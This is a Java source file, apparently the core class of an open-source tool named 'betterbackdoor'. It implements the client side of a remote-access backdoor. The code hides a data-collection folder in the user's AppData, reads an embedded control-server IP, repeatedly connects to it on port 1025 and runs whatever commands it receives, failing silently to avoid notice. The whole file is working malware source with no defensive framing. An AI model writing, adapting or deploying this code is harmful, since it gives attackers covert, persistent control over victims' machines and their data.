package com.thatcherdev.betterbackdoor.backdoor;

import java.io.*;
import java.net.Socket;
import java.util.Scanner;

public class Backdoor {

	public static String ip;
	private static Socket socket;
	private static ObjectInputStream in;
	public static ObjectOutputStream out;
	public static String gatheredDir = System.getProperty("user.home") + "\\AppData\\Gathered\\";

	/**
	 * Constructs and starts a new Backdoor.
	 *
	 * @param args command line arguments
	 */
	public static void main(String[] args) {
		Backdoor backdoor = new Backdoor();
		backdoor.start();
	}

	/**
	 * Constructs a new Backdoor.
	 * <p>
	 * Uses {@link #readFromJar(String)} to get the contents of "ip", a text file
	 * inside the jar file this class will be running from. This file contains the
	 * IP address of the server to be used to control the backdoor. Sets {@link #ip}
	 * to this address. Creates directory {@code gatheredDir}.
	 */
	private Backdoor() {
		try {
			ip = readFromJar("/ip");
			if (!new File(gatheredDir).mkdir())
				throw new Exception();
		} catch (Exception e) {
			System.exit(0);
		}
	}

	/**
	 * Starts backdoor.
	 * <p>
	 * Attempts to connect to the server with the ip address {@link #ip} on port
	 * 1025. Once connected, starts a loop that continuously gets commands from the
	 * server and handles commands with
	 * {@link HandleCommand#handle(String command)}.
	 */
	private void start() {
		try {
			while (true)
				try {
					socket = new Socket(ip, 1025);
					break;
				} catch (Exception e) {
					Thread.sleep(3000);
				}
			out = new ObjectOutputStream(socket.getOutputStream());
			in = new ObjectInputStream(socket.getInputStream());
			while (true) {
				String command = (String) in.readObject();
				HandleCommand.handle(command);
			}
		} catch (Exception e) {
			try {
				if (socket != null)
					socket.close();
				if (in != null)
					in.close();
				if (out != null)
					out.close();
				start();
			} catch (Exception e1) {
				System.exit(0);
			}
		}
	}

	/**
	 * Gets the contents of the file with the name {@code filename} from inside the
	 * jar file this class will be running from.
	 *
	 * @param filename name of the file to get contents of
	 * @return contents of the file
	 */
	private String readFromJar(String filename) {
		String ret;
		Scanner in = new Scanner(getClass().getResourceAsStream(filename));
		ret = in.nextLine();
		in.close();
		return ret;
	}
}